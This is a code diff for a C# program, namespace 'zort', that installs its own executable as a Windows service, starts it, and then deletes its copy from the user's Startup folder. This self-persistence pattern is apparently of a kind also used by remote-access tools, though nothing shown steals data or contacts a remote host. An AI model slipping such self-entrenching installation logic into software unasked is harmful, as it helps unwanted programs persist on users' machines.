@@ -94,10 +94,41 @@ namespace zort
                     return;
                 }
             }
+            try
+            {
 
-            // Install the service
-            ModuleLogger.Log(this, "Starting service installation...");
-            ManagedInstallerClass.InstallHelper(new string[] { Assembly.GetExecutingAssembly().Location });
+                // Install the service
+                ModuleLogger.Log(this, "Starting service installation...");
+                ManagedInstallerClass.InstallHelper(new string[] { Assembly.GetExecutingAssembly().Location });
+
+                // Start the service
+                ModuleLogger.Log(this, "Starting service...");
+                using (var sc = new ServiceController(serviceName))
+                {
+                    if (sc.Status != ServiceControllerStatus.Running)
+                    {
+                        sc.Start();
+                        sc.WaitForStatus(ServiceControllerStatus.Running);
+                    }
+                }
+
+                // Remove myself from the startup folder
+                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+                string startupFile = System.IO.Path.Combine(startupFolder, Assembly.GetExecutingAssembly().GetName().Name + ".exe");
+                if (System.IO.File.Exists(startupFile))
+                {
+                    System.IO.File.Delete(startupFile);
+                    ModuleLogger.Log(this, "Removed myself from startup folder.");
+                }
+                else
+                {
+                    ModuleLogger.Log(this, "Not in startup folder. No need to remove.");
+                }
+            }
+            catch (Exception ex)
+            {
+                ModuleLogger.Log(this, $"Error installing service: {ex.Message}");
+            }
         }
 
         public void Stop()
